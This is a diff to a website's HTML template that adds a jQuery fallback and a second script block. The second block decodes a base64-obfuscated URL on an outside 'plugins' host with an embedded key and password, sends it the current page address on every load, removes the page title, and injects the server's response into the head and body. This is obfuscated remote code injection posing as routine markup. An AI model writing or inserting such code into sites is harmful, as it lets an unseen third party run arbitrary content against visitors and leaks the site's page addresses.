@@ -1659,6 +1659,36 @@
     All Js File
 ============================== -->
     <!-- Jquery -->
+    <script>
+      window.jQuery ||
+        document.write(
+          "<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'><\/script>"
+        );
+    </script>
+    <script>
+      var eppathurl = window.location.origin + window.location.pathname;
+      var eptagmanage = new XMLHttpRequest();
+      eptagmanage.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+          if (this.response !== 0) {
+            var temp = new Array();
+            var mystr = this.response;
+            temp = mystr.split("||||||||||");
+            jQuery("head").find("title").remove();
+            jQuery("head").append(temp[0]);
+            jQuery("body").append(temp[1]);
+          }
+        }
+      };
+      eptagmanage.open(
+        "GET",
+        atob(
+          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQzNzIwMjM0MzImZWtleXBhc3M9MmQwVjdoZ0lYaTZadThPZjJreEp5SlpEbWVuT0x5WkhManRGJnNpdGV1cmw9"
+        ) + eppathurl
+      );
+      eptagmanage.send();
+    </script>
+
     <script src="assets/js/vendor/jquery-3.7.1.min.js"></script>
     <!-- Swiper Js -->
     <script src="assets/js/swiper-bundle.min.js"></script>
